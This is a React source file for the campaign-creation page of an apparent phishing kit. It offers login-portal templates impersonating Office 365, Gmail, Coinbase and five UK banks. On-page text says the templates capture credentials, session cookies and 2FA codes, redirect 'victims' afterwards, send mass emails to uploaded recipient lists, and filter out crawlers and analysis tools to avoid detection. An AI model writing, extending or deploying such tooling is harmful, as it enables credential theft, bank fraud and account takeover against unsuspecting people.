import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { insertCampaignSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Plus, 
  Eye, 
  Zap, 
  Send, 
  Upload, 
  Image as ImageIcon,
  FileText,
  CheckCircle,
  Computer,
  Mail
} from "lucide-react";

const campaignFormSchema = insertCampaignSchema.extend({
  notificationEmail: z.string().email().optional().or(z.literal("")),
});

type CampaignFormData = z.infer<typeof campaignFormSchema>;

export default function CreateCampaignPage() {
  const [selectedCampaignType, setSelectedCampaignType] = useState<"office365" | "gmail" | "coinbase" | "barclays" | "hsbc" | "lloyds" | "natwest" | "santander">("office365");
  const [recipientsFile, setRecipientsFile] = useState<File | null>(null);
  const [imageFiles, setImageFiles] = useState<File[]>([]);
  const { toast } = useToast();
  const queryClient = useQueryClient();

  const form = useForm<CampaignFormData>({
    resolver: zodResolver(campaignFormSchema),
    defaultValues: {
      type: "office365",
      delayMs: 2000,
      botDetectionEnabled: true,
      detectionLevel: "medium",
      redirectUrl: "https://www.coinbase.com/signin",
      customPath: "/Log",
    },
  });

  const createCampaignMutation = useMutation({
    mutationFn: async (data: CampaignFormData) => {
      const response = await apiRequest("POST", "/api/campaigns", data);
      return response.json();
    },
    onSuccess: (campaign) => {
      toast({
        title: "Success",
        description: "Campaign created successfully!",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/campaigns"] });
      form.reset();
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to create campaign.",
        variant: "destructive",
      });
    },
  });

  const uploadRecipientsMutation = useMutation({
    mutationFn: async ({ campaignId, file }: { campaignId: string; file: File }) => {
      const formData = new FormData();
      formData.append("file", file);
      const response = await fetch(`/api/campaigns/${campaignId}/recipients`, {
        method: "POST",
        body: formData,
        credentials: "include",
      });
      if (!response.ok) throw new Error("Upload failed");
      return response.json();
    },
  });

  const onSubmit = async (data: CampaignFormData) => {
    try {
      const campaign = await createCampaignMutation.mutateAsync({
        ...data,
        type: selectedCampaignType,
      });

      // Upload recipients file if provided
      if (recipientsFile && campaign.id) {
        await uploadRecipientsMutation.mutateAsync({
          campaignId: campaign.id,
          file: recipientsFile,
        });
      }
    } catch (error) {
      console.error("Campaign creation failed:", error);
    }
  };

  // Handle preview campaign
  const handlePreviewCampaign = () => {
    const formData = form.getValues();
    const previewUrl = `/preview/${selectedCampaignType}?customPath=${encodeURIComponent(formData.customPath || '/Log')}`;
    
    // Open preview in new tab
    window.open(previewUrl, '_blank');
    
    toast({
      title: "Preview Opened",
      description: `Campaign preview opened in new tab for ${selectedCampaignType.toUpperCase()}`,
    });
  };

  // Handle test campaign
  const handleTestCampaign = () => {
    const formData = form.getValues();
    
    if (!formData.name) {
      toast({
        title: "Error",
        description: "Please enter a campaign name before testing.",
        variant: "destructive",
      });
      return;
    }

    // In a real implementation, this would send a test email to the user
    toast({
      title: "Test Campaign",
      description: `Test campaign functionality for "${formData.name}" - would send test email to admin`,
    });
  };

  const handleRecipientsFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setRecipientsFile(file);
    }
  };

  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    setImageFiles(prev => [...prev, ...files]);
  };

  return (
    <div className="h-full overflow-y-auto">
      {/* Page Header */}
      <div className="bg-card border-b border-border px-6 py-4">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-bold text-foreground">Create Campaign</h1>
        </div>
      </div>

      <div className="p-6 max-w-6xl mx-auto">
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
          {/* Campaign Type Selector */}
          <Card>
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold text-foreground mb-6">Select Campaign Type</h3>
              
              {/* Email & Platform Campaigns */}
              <div className="mb-8">
                <h4 className="text-md font-medium text-foreground mb-4 flex items-center">
                  <span className="mr-2">📧</span>
                  Email & Platform Campaigns
                </h4>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  <Card 
                className={`cursor-pointer transition-all duration-200 ${
                  selectedCampaignType === "office365" 
                    ? "border-primary bg-primary/5" 
                    : "border-border hover:bg-muted/20"
                }`}
                onClick={() => {
                  setSelectedCampaignType("office365");
                  form.setValue("type", "office365");
                }}
                data-testid="card-office365"
              >
                <CardContent className="p-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-3">
                      <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center">
                        <Computer className="w-6 h-6 text-primary" />
                      </div>
                      <div>
                        <h4 className="text-lg font-semibold text-foreground">Office 365</h4>
                        <p className="text-sm text-muted-foreground">Target Computer Office 365 users with login portal</p>
                      </div>
                    </div>
                    {selectedCampaignType === "office365" && (
                      <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                        <CheckCircle className="w-3 h-3 text-primary-foreground" />
                      </div>
                    )}
                  </div>
                  <ul className="text-sm text-muted-foreground space-y-1">
                    <li>• Model: Computer 365</li>
                    <li>• Captures Computer credentials and session cookies</li>
                    <li>• High success rate for corporate environments</li>
                  </ul>
                </CardContent>
              </Card>

              <Card 
                className={`cursor-pointer transition-all duration-200 ${
                  selectedCampaignType === "gmail" 
                    ? "border-primary bg-primary/5" 
                    : "border-border hover:bg-muted/20"
                }`}
                onClick={() => {
                  setSelectedCampaignType("gmail");
                  form.setValue("type", "gmail");
                }}
                data-testid="card-gmail"
              >
                <CardContent className="p-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-3">
                      <div className="w-12 h-12 bg-blue-500/20 rounded-lg flex items-center justify-center">
                        <Mail className="w-6 h-6 text-blue-400" />
                      </div>
                      <div>
                        <h4 className="text-lg font-semibold text-foreground">Gmail</h4>
                        <p className="text-sm text-muted-foreground">Target Google Mail users with Google login portal</p>
                      </div>
                    </div>
                    {selectedCampaignType === "gmail" && (
                      <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                        <CheckCircle className="w-3 h-3 text-primary-foreground" />
                      </div>
                    )}
                  </div>
                  <ul className="text-sm text-muted-foreground space-y-1">
                    <li>• Model: Gmail</li>
                    <li>• Uses Google bypass for improved success rate</li>
                    <li>• Effective for personal and workspace accounts</li>
                  </ul>
                </CardContent>
              </Card>

              <Card 
                className={`cursor-pointer transition-all duration-200 ${
                  selectedCampaignType === "coinbase" 
                    ? "border-primary bg-primary/5" 
                    : "border-border hover:bg-muted/20"
                }`}
                onClick={() => {
                  setSelectedCampaignType("coinbase");
                  form.setValue("type", "coinbase");
                }}
                data-testid="card-coinbase"
              >
                <CardContent className="p-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-3">
                      <div className="w-12 h-12 bg-blue-600/20 rounded-lg flex items-center justify-center">
                        <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs font-bold">₿</div>
                      </div>
                      <div>
                        <h4 className="text-lg font-semibold text-foreground">Coinbase</h4>
                        <p className="text-sm text-muted-foreground">Target cryptocurrency users with authentic login portal</p>
                      </div>
                    </div>
                    {selectedCampaignType === "coinbase" && (
                      <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                        <CheckCircle className="w-3 h-3 text-primary-foreground" />
                      </div>
                    )}
                  </div>
                  <ul className="text-sm text-muted-foreground space-y-1">
                    <li>• Model: Coinbase Exchange</li>
                    <li>• Captures login credentials and 2FA codes</li>
                    <li>• High success rate for crypto traders</li>
                  </ul>
                  </CardContent>
                </Card>
              </div>
            </div>

            {/* UK Banking Campaigns */}
            <div className="mb-6">
              <h4 className="text-md font-medium text-foreground mb-4 flex items-center">
                <span className="mr-2">🏦</span>
                UK Banking Campaigns
              </h4>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">

                {/* Barclays */}
                <Card 
                  className={`cursor-pointer transition-all duration-200 ${
                    selectedCampaignType === "barclays" 
                      ? "border-primary bg-primary/5" 
                      : "border-border hover:bg-muted/20"
                  }`}
                  onClick={() => {
                    setSelectedCampaignType("barclays");
                    form.setValue("type", "barclays");
                  }}
                  data-testid="card-barclays"
                >
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-12 h-12 bg-blue-800/20 rounded-lg flex items-center justify-center">
                          <div className="text-lg font-bold text-blue-700">B</div>
                        </div>
                        <div>
                          <h4 className="text-lg font-semibold text-foreground">Barclays</h4>
                          <p className="text-sm text-muted-foreground">Target UK banking customers with authentic portal</p>
                        </div>
                      </div>
                      {selectedCampaignType === "barclays" && (
                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
                        </div>
                      )}
                    </div>
                    <ul className="text-sm text-muted-foreground space-y-1">
                      <li>• Model: Barclays Online Banking</li>
                      <li>• Captures login and security details</li>
                      <li>• High recognition in UK market</li>
                    </ul>
                  </CardContent>
                </Card>

                {/* HSBC */}
                <Card 
                  className={`cursor-pointer transition-all duration-200 ${
                    selectedCampaignType === "hsbc" 
                      ? "border-primary bg-primary/5" 
                      : "border-border hover:bg-muted/20"
                  }`}
                  onClick={() => {
                    setSelectedCampaignType("hsbc");
                    form.setValue("type", "hsbc");
                  }}
                  data-testid="card-hsbc"
                >
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-12 h-12 bg-red-600/20 rounded-lg flex items-center justify-center">
                          <div className="text-sm font-bold text-red-600">HSBC</div>
                        </div>
                        <div>
                          <h4 className="text-lg font-semibold text-foreground">HSBC</h4>
                          <p className="text-sm text-muted-foreground">Global banking with strong UK presence</p>
                        </div>
                      </div>
                      {selectedCampaignType === "hsbc" && (
                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
                        </div>
                      )}
                    </div>
                    <ul className="text-sm text-muted-foreground space-y-1">
                      <li>• Model: HSBC UK Online Banking</li>
                      <li>• Targets business and personal accounts</li>
                      <li>• Effective for professional users</li>
                    </ul>
                  </CardContent>
                </Card>

                {/* Lloyds */}
                <Card 
                  className={`cursor-pointer transition-all duration-200 ${
                    selectedCampaignType === "lloyds" 
                      ? "border-primary bg-primary/5" 
                      : "border-border hover:bg-muted/20"
                  }`}
                  onClick={() => {
                    setSelectedCampaignType("lloyds");
                    form.setValue("type", "lloyds");
                  }}
                  data-testid="card-lloyds"
                >
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-12 h-12 bg-green-700/20 rounded-lg flex items-center justify-center">
                          <div className="text-lg font-bold text-green-700">L</div>
                        </div>
                        <div>
                          <h4 className="text-lg font-semibold text-foreground">Lloyds Banking</h4>
                          <p className="text-sm text-muted-foreground">Popular high street banking solution</p>
                        </div>
                      </div>
                      {selectedCampaignType === "lloyds" && (
                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
                        </div>
                      )}
                    </div>
                    <ul className="text-sm text-muted-foreground space-y-1">
                      <li>• Model: Lloyds Internet Banking</li>
                      <li>• Wide customer base coverage</li>
                      <li>• Trusted brand recognition</li>
                    </ul>
                  </CardContent>
                </Card>

                {/* NatWest */}
                <Card 
                  className={`cursor-pointer transition-all duration-200 ${
                    selectedCampaignType === "natwest" 
                      ? "border-primary bg-primary/5" 
                      : "border-border hover:bg-muted/20"
                  }`}
                  onClick={() => {
                    setSelectedCampaignType("natwest");
                    form.setValue("type", "natwest");
                  }}
                  data-testid="card-natwest"
                >
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-12 h-12 bg-purple-700/20 rounded-lg flex items-center justify-center">
                          <div className="text-sm font-bold text-purple-700">NW</div>
                        </div>
                        <div>
                          <h4 className="text-lg font-semibold text-foreground">NatWest</h4>
                          <p className="text-sm text-muted-foreground">Leading UK retail and business banking</p>
                        </div>
                      </div>
                      {selectedCampaignType === "natwest" && (
                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
                        </div>
                      )}
                    </div>
                    <ul className="text-sm text-muted-foreground space-y-1">
                      <li>• Model: NatWest Online Banking</li>
                      <li>• Strong business banking focus</li>
                      <li>• Distinctive purple branding</li>
                    </ul>
                  </CardContent>
                </Card>

                {/* Santander */}
                <Card 
                  className={`cursor-pointer transition-all duration-200 ${
                    selectedCampaignType === "santander" 
                      ? "border-primary bg-primary/5" 
                      : "border-border hover:bg-muted/20"
                  }`}
                  onClick={() => {
                    setSelectedCampaignType("santander");
                    form.setValue("type", "santander");
                  }}
                  data-testid="card-santander"
                >
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-12 h-12 bg-red-700/20 rounded-lg flex items-center justify-center">
                          <div className="text-sm font-bold text-red-700">S</div>
                        </div>
                        <div>
                          <h4 className="text-lg font-semibold text-foreground">Santander</h4>
                          <p className="text-sm text-muted-foreground">International banking with UK operations</p>
                        </div>
                      </div>
                      {selectedCampaignType === "santander" && (
                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
                        </div>
                      )}
                    </div>
                    <ul className="text-sm text-muted-foreground space-y-1">
                      <li>• Model: Santander Online Banking</li>
                      <li>• Popular mortgage and savings provider</li>
                      <li>• Effective for UK customers</li>
                    </ul>
                  </CardContent>
                </Card>
              </div>
            </div>
            </CardContent>
          </Card>

          {/* Campaign Settings */}
          <Card>
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold text-foreground mb-6">Campaign Settings</h3>
              
              <div className="space-y-6">
                {/* Basic Settings */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <Label htmlFor="name">Campaign Name</Label>
                    <Input
                      id="name"
                      {...form.register("name")}
                      placeholder="Enter campaign name"
                      data-testid="input-campaign-name"
                    />
                  </div>
                  <div>
                    <Label htmlFor="delayMs">Delay Between Emails (ms)</Label>
                    <Input
                      id="delayMs"
                      type="number"
                      {...form.register("delayMs", { valueAsNumber: true })}
                      data-testid="input-delay"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <Label htmlFor="notificationEmail">Notification Email (Optional)</Label>
                    <Input
                      id="notificationEmail"
                      type="email"
                      {...form.register("notificationEmail")}
                      placeholder="admin@yourcompany.com"
                      data-testid="input-notification-email"
                    />
                    <p className="text-xs text-muted-foreground mt-1">Receive campaign completion report</p>
                  </div>
                  <div>
                    <Label htmlFor="domain">Domain</Label>
                    <Input
                      id="domain"
                      {...form.register("domain")}
                      placeholder="example.com"
                      data-testid="input-domain"
                    />
                    <p className="text-xs text-red-400 mt-1">Enter domain name without http:// or www</p>
                  </div>
                </div>

                {/* URLs */}
                <div>
                  <Label htmlFor="redirectUrl">Final Redirect URL</Label>
                  <Input
                    id="redirectUrl"
                    {...form.register("redirectUrl")}
                    data-testid="input-redirect-url"
                  />
                  <p className="text-xs text-muted-foreground mt-1">Victims will be redirected here after credentials are captured</p>
                </div>

                <div>
                  <Label htmlFor="customPath">Custom URL Path (Optional)</Label>
                  <Input
                    id="customPath"
                    {...form.register("customPath")}
                    placeholder="/login"
                    data-testid="input-custom-path"
                  />
                  <p className="text-xs text-muted-foreground mt-1">Customize URL path instead of random slug</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* File Uploads */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Recipients List */}
            <Card>
              <CardContent className="p-6">
                <h3 className="text-lg font-semibold text-foreground mb-4">Recipients List</h3>
                <div className="border-2 border-dashed border-border rounded-lg p-8 text-center hover:border-primary/50 transition-colors">
                  <div className="w-16 h-16 mx-auto mb-4 bg-muted/30 rounded-lg flex items-center justify-center">
                    <FileText className="w-8 h-8 text-muted-foreground" />
                  </div>
                  <p className="text-foreground mb-1">
                    Drop your .txt file here or{" "}
                    <label className="text-primary cursor-pointer">
                      click to browse
                      <input
                        type="file"
                        accept=".txt"
                        onChange={handleRecipientsFileChange}
                        className="hidden"
                        data-testid="input-recipients-file"
                      />
                    </label>
                  </p>
                  <p className="text-sm text-muted-foreground">One email per line</p>
                  {recipientsFile && (
                    <div className="mt-4 p-2 bg-green-500/10 border border-green-500/20 rounded">
                      <p className="text-sm text-green-400">✓ {recipientsFile.name}</p>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>

            {/* Image Management */}
            <Card>
              <CardContent className="p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-foreground">Image Management (CIDs)</h3>
                  <Button size="sm" className="bg-green-600 hover:bg-green-700" data-testid="button-upload-image">
                    <Upload className="w-4 h-4 mr-2" />
                    Upload Image
                  </Button>
                </div>
                <div className="border-2 border-dashed border-border rounded-lg p-8 text-center hover:border-primary/50 transition-colors">
                  <div className="w-16 h-16 mx-auto mb-4 bg-muted/30 rounded-lg flex items-center justify-center">
                    <ImageIcon className="w-8 h-8 text-muted-foreground" />
                  </div>
                  <p className="text-foreground mb-1">
                    Drag & drop images here or{" "}
                    <label className="text-primary cursor-pointer">
                      click to browse
                      <input
                        type="file"
                        accept="image/*"
                        multiple
                        onChange={handleImageFileChange}
                        className="hidden"
                        data-testid="input-image-files"
                      />
                    </label>
                  </p>
                  <p className="text-sm text-muted-foreground">Upload images from your campaign</p>
                  {imageFiles.length > 0 && (
                    <div className="mt-4 space-y-2">
                      {imageFiles.map((file, index) => (
                        <div key={index} className="p-2 bg-green-500/10 border border-green-500/20 rounded">
                          <p className="text-sm text-green-400">✓ {file.name}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Bot Detection */}
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center space-x-3">
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="botDetection"
                      checked={form.watch("botDetectionEnabled") ?? false}
                      onCheckedChange={(checked) => form.setValue("botDetectionEnabled", !!checked)}
                      data-testid="checkbox-bot-detection"
                    />
                    <Label htmlFor="botDetection" className="cursor-pointer">Enable Bot Detection</Label>
                  </div>
                  <Badge className="bg-primary/20 text-primary">NEW</Badge>
                </div>
              </div>
              <p className="text-sm text-muted-foreground mb-4">
                Protects against crawlers, bots and analysis tools to avoid being red flagged
              </p>
              
              <div>
                <Label>Detection Level</Label>
                <Select 
                  value={form.watch("detectionLevel") ?? "medium"} 
                  onValueChange={(value) => form.setValue("detectionLevel", value)}
                  data-testid="select-detection-level"
                >
                  <SelectTrigger className="w-full md:w-64">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="low">Low (Basic protection)</SelectItem>
                    <SelectItem value="medium">Medium (Recommended)</SelectItem>
                    <SelectItem value="high">High (Strict filtering)</SelectItem>
                    <SelectItem value="custom">Custom</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </CardContent>
          </Card>

          {/* Campaign Actions */}
          <Card>
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <Button 
                  type="button" 
                  variant="secondary" 
                  onClick={handlePreviewCampaign}
                  data-testid="button-preview"
                >
                  <Eye className="w-4 h-4 mr-2" />
                  Preview Campaign
                </Button>
                
                <div className="flex items-center space-x-3">
                  <Button 
                    type="button" 
                    className="bg-orange-600 hover:bg-orange-700" 
                    onClick={handleTestCampaign}
                    data-testid="button-test"
                  >
                    <Zap className="w-4 h-4 mr-2" />
                    Test Campaign
                  </Button>
                  <Button 
                    type="submit" 
                    disabled={createCampaignMutation.isPending}
                    data-testid="button-start-campaign"
                  >
                    <Send className="w-4 h-4 mr-2" />
                    {createCampaignMutation.isPending ? "Creating..." : "Start Mass Campaign"}
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </form>
      </div>
    </div>
  );
}
